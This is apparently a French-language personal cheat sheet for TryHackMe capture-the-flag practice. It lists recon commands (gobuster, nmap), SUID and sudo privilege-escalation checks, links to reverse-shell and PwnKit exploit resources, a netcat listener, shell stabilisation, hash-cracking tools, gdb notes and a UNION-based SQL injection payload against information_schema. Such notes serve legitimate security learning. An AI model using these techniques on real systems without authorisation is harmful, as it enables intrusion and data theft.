# TryHackMe



https://github.com/veikoon/pentest/blob/master/commandes.md

Utilitaire :

​	wordlists: ls /usr/share/wordlists/dirb/
​	tmux : <ctrl+a> </> <*>  créer des nouvelles fenêtres

## Premier etape

**Endpoint : ** 

​					gobuster dir -k -x txt,json,php,html -u http://$IP -w /opt/wordlists/common.txt
​					gobuster fuzz --exclude-length XXXX -b 404 -k -u http://$IP/fuzz -w /opt/wordlist/common.txt

**Port : **nmap -sC -sV -A -oN nmap.log $IP

## Reverse Shell

[Github des différentes reverse Shell command](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#tools)]

[Liste des exploit avec permission](https://gtfobins.github.io/)

```
Find all SUID files:
find / -perm -4000 -print 2>>/dev/null
Find all SGID files:
find / -perm -2000 -print 
```



```
all sudo avaible
sudo -l
```



Heberger un serveur pour passer des fichier

```
python2 -m SimpleHTTPServer
```



**PWnk!it    Exploit CVE-2021-4034**  [Github  source](https://github.com/ly4k/PwnKit)
**LinPeass analyse des faille dun système** [Github Source](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)



Stabiliser bash :

```
python -c 'import pty; pty.spawn("/bin/bash")'

ctr+z

stty raw -echo; fg
```



*Si accés a l'uppload de fichier penssé a upload un fichier reverse php ?*

**Ne pas oublier d'écouter le port**

```
nc -lvp 4242
```



## Hash

haiti -e 42f749ade7f9e195bf475f37a44cafcb
https://crackstation.net/

JohnTheReapper

## Reverse Engenering

gdv ./Programme
disas main
break point
`i r` (info registry)
x/s $XXXX



gdb
jump j *@ (modifié)
breakpoint b *@

## Sql injection

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

```sql
group_concat()
```

get the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. (modifié)

```sql
information_schema
```

contains information about all the databases and tables the user has access to
